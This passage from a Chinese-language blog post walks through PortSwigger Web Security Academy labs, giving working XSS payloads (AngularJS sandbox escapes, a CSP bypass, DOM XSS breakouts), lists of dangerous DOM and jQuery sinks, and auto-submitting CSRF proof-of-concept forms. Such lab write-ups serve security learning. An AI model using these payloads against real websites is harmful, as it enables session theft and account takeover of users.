</li>
<li><p><code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>：这是注入恶意 JavaScript 代码的语法。它会在 AngularJS 中的 <code>orderBy</code> 过滤器内部执行。</p>
<p>让我们来看一下这个表达式的不同部分：</p>
<ul>
<li><p><code>toString()</code>：这个函数返回一个对象的字符串表示形式，如上所述。</p>
</li>
<li><p><code>constructor</code>：这是 <code>toString()</code> 函数的构造函数，即 <code>Function()</code> 构造函数。</p>
</li>
<li><p><code>fromCharCode(120,61,97,108,101,114,116,40,49,41)</code>：这个函数接受一个或多个 Unicode 编码的参数，并返回一个由这些字符组成的字符串。在这种情况下，它返回字符串 “x=alert(1)”。</p>
</li>
<li><p><code>=</code>：这是一个赋值操作符，用于将表达式的结果赋给变量 <code>x</code>。</p>
</li>
<li><p><code>1</code>：这是一个数字字面量，表示变量 <code>x</code> 的值为 1。</p>
</li>
</ul>
</li>
</ul>
<p>因此，整个表达式将变量 <code>x</code> 的值设置为 <code>1</code>，从而执行恶意 JavaScript 代码 “alert(1)”，它会在浏览器中弹出一个警报框，显示数字 1。</p>
</blockquote>
<p>该漏洞利用 <code>toString()</code> 创建字符串而不使用引号。然后，它获取 <code>String</code> 原型并覆盖每个字符串的 <code>charAt</code> 函数。这有效地破坏了AngularJS沙箱。接下来，将数组传递给 <code>orderBy</code> 筛选器。然后，我们再次使用 <code>toString()</code> 创建字符串和 <code>String</code> 构造函数属性来设置筛选器的参数。最后，我们使用 <code>fromCharCode</code> 方法通过将字符代码转换为字符串 <code>x=alert(1)</code> 来生成我们的有效负载。由于 <code>charAt</code> 函数已被覆盖，因此 AngularJS 将允许此代码，而通常不会。</p>
<h3 id="LAB-带有AngularJS沙箱转义和CSP的反射式XSS"><a href="#LAB-带有AngularJS沙箱转义和CSP的反射式XSS" class="headerlink" title="LAB:带有AngularJS沙箱转义和CSP的反射式XSS"></a>LAB:带有AngularJS沙箱转义和CSP的反射式XSS</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">location=<span class="string">&#x27;https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516145025662.png" alt="image-20230516145025662"></p>
<p>该漏洞利用 AngularJS 中的 <code>ng-focus</code> 事件创建绕过 CSP 的焦点事件。它还使用 <code>$event</code> ，这是一个引用事件对象的 AngularJS 变量。 <code>path</code> 属性特定于 Chrome，包含触发事件的元素数组。数组中的最后一个元素包含 <code>window</code> 对象。</p>
<p>通常， <code>|</code> 是 JavaScript 中的按位或操作，但在 AngularJS 中，它表示过滤器操作，在本例中为 <code>orderBy</code> 过滤器。冒号表示要发送到筛选器的参数。在参数中，我们不是直接调用 <code>alert</code> 函数，而是将其分配给变量 <code>z</code> 。仅当 <code>orderBy</code> 操作到达 <code>$event.path</code> 数组中的 <code>window</code> 对象时，才会调用该函数。这意味着它可以在窗口范围内调用，而无需显式引用 <code>window</code> 对象，从而有效地绕过 AngularJS 的 <code>window</code> 检查。</p>
<h3 id="LAB-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#LAB-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="LAB:DOM XSS in document.write sink using source location.search inside a select element"></a>LAB:DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516213244272.png" alt="image-20230516213244272"></p>
<p>这里我们通过测试发现 可以通过JS代码注入DOM</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516213815571.png" alt="image-20230516213815571"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;storeId=test&lt;/option&gt;&lt;/select&gt;&lt;img%20src=x%20onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516214144556.png" alt="image-20230516214144556"></p>
<h3 id="AngularJS中的DOM-XSS"><a href="#AngularJS中的DOM-XSS" class="headerlink" title="AngularJS中的DOM XSS"></a>AngularJS中的DOM XSS</h3><p>如果使用像 AngularJS 这样的框架，则可以在没有尖括号或事件的情况下执行 JavaScript。当网站使用<code>ng-app</code>HTML 元素上的属性时，它将由 AngularJS 处理。在这种情况下，AngularJS 将在双花括号内执行 JavaScript，这可以直接出现在 HTML 中或属性内部。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516222425969.png" alt="image-20230516222425969"></p>
<h2 id="DOM-XSS-结合反映和存储的数据"><a href="#DOM-XSS-结合反映和存储的数据" class="headerlink" title="DOM XSS 结合反映和存储的数据"></a>DOM XSS 结合反映和存储的数据</h2><p>一些纯基于 DOM 的漏洞是独立于单个页面中的。如果脚本从 URL 读取一些数据并将其写入危险的接收器，则漏洞完全是客户端的。</p>
<p>然而，来源并不局限于浏览器直接公开的数据——它们也可以来自网站。例如，网站通常会在服务器的 HTML 响应中反映 URL 参数。这通常与普通 XSS 相关联，但它也可能导致反射 DOM XSS 漏洞。</p>
<p>在反映的 DOM XSS 漏洞中，服务器处理来自请求的数据，并将数据回显到响应中。反射的数据可能会被放入 JavaScript 字符串文字或 DOM 中的数据项中，例如表单字段。然后页面上的脚本以不安全的方式处理反射数据，最终将其写入危险的接收器。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;var data = &quot;reflected string&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="LAB-反射型DOM-XSS"><a href="#LAB-反射型DOM-XSS" class="headerlink" title="LAB:反射型DOM XSS"></a>LAB:反射型DOM XSS</h3><p>查找时 调用了外部的js文件  进一步调用JS文件中的search方法</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516235219208.png" alt="image-20230516235219208"></p>
<p>跟进方法查看  发现这个search-results是一个路径 而且可以联合查询内容进行访问</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516235149629.png" alt="image-20230516235149629"></p>
<p>这一段会发送一个搜索操作的GET请求，并且利用函数displaySearchResults展示搜索结果，下面我们再来分析一下这个函数</p>
<p>继续往下看，发现搜索结果就是从这里返回的</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516235512417.png" alt="image-20230516235512417"></p>
<p>我们看到这个函数会将变量searchTerm拼接到一个h1元素中，但是因为是innerText，所以肯定会有些字符被转义，我们需要一点点调试</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516235609986.png" alt="image-20230516235609986"></p>
<p>用尖括号试一下</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516235758919.png" alt="image-20230516235758919"></p>
<p>思路差不多出来了 拼接闭合json语句  所以我们要解决的就是双引号闭合<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230516235840690.png" alt="image-20230516235840690"></p>
<p>尝试发现双引号被转义，前面遇到过类似的，我们只需要把转义使用的反斜杠转义就可以了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517000025550.png" alt="image-20230517000025550"></p>
<p>最终的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;-alert(1)&#125;//</span><br></pre></td></tr></table></figure>

<p>括号应该是为了闭合前面的括号，后面斜杠就是注释掉后面没用的</p>
<p>最终的search-Term就被注入到了DOM中，实现dom xss</p>
<p>以下代码便是实现原理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> h1 = <span class="built_in">document</span>.createElement(<span class="string">&quot;h1&quot;</span>);</span><br><span class="line">h1.innerText = searchResults.length + <span class="string">&quot; search results for &#x27;&quot;</span> + searchTerm + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">blogHeader.appendChild(h1);</span><br><span class="line"><span class="keyword">var</span> hr = <span class="built_in">document</span>.createElement(<span class="string">&quot;hr&quot;</span>);</span><br><span class="line">blogHeader.appendChild(hr)</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517000534957.png" alt="image-20230517000534957"></p>
<p>网站还可以将数据存储在服务器上并将其反映到其他地方。在存储型 DOM XSS 漏洞中，服务器从一个请求中接收数据，存储它，然后将数据包含在稍后的响应中。稍后响应中的脚本包含一个接收器，该接收器然后以不安全的方式处理数据。</p>
<h3 id="LAB-存储型DOM-XSS"><a href="#LAB-存储型DOM-XSS" class="headerlink" title="LAB:存储型DOM XSS"></a>LAB:存储型DOM XSS</h3><p>相同思路，源文件和查询路径都在这</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517002052264.png" alt="image-20230517002052264"></p>
<p>追溯文件方法</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517002125720.png" alt="image-20230517002125720"></p>
<pre><code>xhr.open(&quot;GET&quot;, postCommentPath + window.location.search);
xhr.send();
</code></pre>
<p>传入后 请求评论查询路径  发现反斜杠也被转义了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517002022638.png" alt="image-20230517002022638"></p>
<p>这里思路有点问题  被上一题的思路局限住了  而且不应该在website上注入  因为他不是显式的</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517002959890.png" alt="image-20230517002959890"></p>
<p>回看js代码  发现&lt;&gt;被实体编码了 但是只进行一次这个操作，所以我们可以利用一对尖括号使用掉这个操作，保护后面的尖括号，所以我们在评论提交点这样构造payload</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517003140197.png" alt="image-20230517003140197"></p>
<p>可以发现已经成功了<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230517003226274.png" alt="image-20230517003226274"></p>
<h2 id="哪些接收器会导致-DOM-XSS-漏洞？"><a href="#哪些接收器会导致-DOM-XSS-漏洞？" class="headerlink" title="哪些接收器会导致 DOM-XSS 漏洞？"></a>哪些接收器会导致 DOM-XSS 漏洞？</h2><p>以下是一些可能导致 DOM-XSS 漏洞的主要漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">document.write() </span><br><span class="line">document.writeln() </span><br><span class="line">document.domain </span><br><span class="line">element.innerHTML </span><br><span class="line">element.outerHTML </span><br><span class="line">element.insertAdjacentHTML </span><br><span class="line">element.onevent</span><br></pre></td></tr></table></figure>

<p>以下 jQuery 函数也是可能导致 DOM-XSS 漏洞的接收器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add()</span><br><span class="line">after()</span><br><span class="line">append()</span><br><span class="line">animate()</span><br><span class="line">insertAfter()</span><br><span class="line">insertBefore()</span><br><span class="line">before()</span><br><span class="line">html()</span><br><span class="line">prepend()</span><br><span class="line">replaceAll()</span><br><span class="line">replaceWith()</span><br><span class="line">wrap()</span><br><span class="line">wrapInner()</span><br><span class="line">wrapAll()</span><br><span class="line">has()</span><br><span class="line">constructor()</span><br><span class="line">init()</span><br><span class="line">index()</span><br><span class="line">jQuery.parseHTML()</span><br><span class="line">$.parseHTML()</span><br></pre></td></tr></table></figure>

<h1 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h1><p>CSRF攻击成为可能需要具备三个关键条件：</p>
<ul>
<li><strong>一个相关的行为。</strong>应用程序中存在攻击者有理由诱导的操作：可能是特权操作（修改其他用户的权限等）或针对用户特定数据的任何操作（更改用户自己的密码等）</li>
<li><strong>基于cookie的会话处理。</strong>执行该操作设计一个或多个HTTP请求，应用程序仅依赖 cookie来识别发出请求的用户。没有其他机制来跟踪会话或验证会话请求。</li>
<li><strong>没有不可预测的请求参数。</strong>执行操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改密码时，如果攻击者知道现有密码的值</li>
</ul>
<p>假设一个应用程序包含一个允许用户更改其帐户电子邮件地址的功能。当用户执行此操作时，他们会发出如下 HTTP 请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span class="line">email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>

<p>这样就满足了CSRF需要的条件：</p>
<ul>
<li>更改用户帐户上的电子邮件地址的操作是攻击者感兴趣的。执行此操作后，攻击者通常能够触发密码重置并完全控制用户帐户。</li>
<li>应用程序使用会话 cookie 来识别哪个用户发出了请求。没有其他令牌或机制来跟踪用户会话。</li>
<li>攻击者可以轻松确定执行操作所需的请求参数的值。</li>
</ul>
<p>有了这些条件，攻击者就可以构建一个包含以下 HTML 的网页：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果受害用户访问攻击者的网页，会发生以下情况：</p>
<ul>
<li>攻击者的页面将触发对易受攻击网站的 HTTP 请求。</li>
<li>如果用户登录到易受攻击的网站，他们的浏览器将自动在请求中包含他们的会话 cookie（假设未使用 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf#common-defences-against-csrf">SameSite cookie ）。</a></li>
<li>易受攻击的网站将以正常方式处理请求，将其视为受害用户发出的请求，并更改其电子邮件地址。</li>
</ul>
<h2 id="LAB-没有防御的-CSRF-漏洞"><a href="#LAB-没有防御的-CSRF-漏洞" class="headerlink" title="LAB:没有防御的 CSRF 漏洞"></a>LAB:没有防御的 CSRF 漏洞</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0af60016049f93138287107c009d00d8.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111<span class="symbol">&amp;#64;</span>aasd&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230518234734578.png" alt="image-20230518234734578"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230518234803239.png" alt="image-20230518234803239"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://css0k.github.io">css_0k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://css0k.github.io/2023/03/10/Burpsuite-Client/">https://css0k.github.io/2023/03/10/Burpsuite-Client/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Burpsuite%E9%9D%B6%E5%9C%BA/">Burpsuite靶场</a><a class="post-meta__tags" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%BC%8F%E6%B4%9E/">客户端漏洞</a></div><div class="post_share"><div class="social-share" data-image="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/12112613631567912103.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/10/XSS-CheatSheet/"><img class="prev-cover" src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/1231089302393092769.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">XSS-CheatSheet</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/18/Burpsuite-Server/"><img class="next-cover" src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Burpsuite-Server</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/02/18/Burpsuite-Server/" title="Burpsuite-Server"><img class="cover" src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-03-10</div><div class="title">Burpsuite-Server</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929211155.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">css_0k</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/css0k/css0k.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1327246897@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OAuth2-0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">OAuth2.0身份验证漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%870Auth%E9%9A%90%E5%BC%8F%E6%B5%81%E7%A8%8B%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.通过0Auth隐式流程绕过身份验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Cross-site-scripting"><span class="toc-number">2.</span> <span class="toc-text">XSS[Cross-site scripting]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E6%9C%80%E6%B5%81%E8%A1%8C%E3%80%81%E6%9C%80%E5%BC%BA%E5%A4%A7%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">三种最流行、最强大的利用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96cookie"><span class="toc-number">2.1.1.</span> <span class="toc-text">窃取cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%87%AA%E5%8A%A8%E5%A1%AB%E5%85%85%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">获取自动填充密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CCSRF"><span class="toc-number">2.1.3.</span> <span class="toc-text">执行CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%88%A9%E7%94%A8xss%E6%89%A7%E8%A1%8CCSRF"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">LAB: 利用xss执行CSRF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">2.1.4.</span> <span class="toc-text">1.反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E5%AD%98%E5%82%A8%E5%9E%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.1.6.</span> <span class="toc-text">反射型和存储型的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8EDOM%E5%9E%8BXSS-location-search-gt-document-write"><span class="toc-number">2.1.7.</span> <span class="toc-text">3.基于DOM型XSS: location.search-&gt;document.write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9F%BA%E4%BA%8EDOM%E5%9E%8BXSS-location-search-gt-innerHTML"><span class="toc-number">2.1.8.</span> <span class="toc-text">4.基于DOM型XSS: location.search-&gt;innerHTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-number">2.1.9.</span> <span class="toc-text">5.DOM XSS in jQuery anchor href attribute sink using location.search source</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E4%BD%BF%E7%94%A8-hashchange-%E4%BA%8B%E4%BB%B6%E7%9A%84-jQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E7%9A%84-DOM-XSS"><span class="toc-number">2.1.9.1.</span> <span class="toc-text">LAB: 使用 hashchange 事件的 jQuery 选择器接收器中的 DOM XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%B0%86-XSS-%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84-HTML-%E7%BC%96%E7%A0%81%E7%9A%84%E5%B1%9E%E6%80%A7%E4%B8%AD"><span class="toc-number">2.1.9.2.</span> <span class="toc-text">LAB: 将 XSS 反射到带有尖括号的 HTML 编码的属性中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4%E7%9A%84XSS"><span class="toc-number">2.2.</span> <span class="toc-text">HTML标签之间的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%B0%86XSS%E5%8F%8D%E6%98%A0%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E9%98%BB%E6%AD%A2"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">LAB: 将XSS反映到HTML上下文中，大多数标签和属性被阻止</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">LAB: Reflected XSS into HTML context with all tags blocked except custom ones</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-Reflected-XSS-with-event-handlers-and-href-attributes-blocked"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">LAB: Reflected XSS with event handlers and href attributes blocked</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-Reflected-XSS-with-some-SVG-markup-allowed"><span class="toc-number">2.2.0.4.</span> <span class="toc-text">LAB: Reflected XSS with some SVG markup allowed</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">HTML 标签属性中的 XSS</span></a><ol 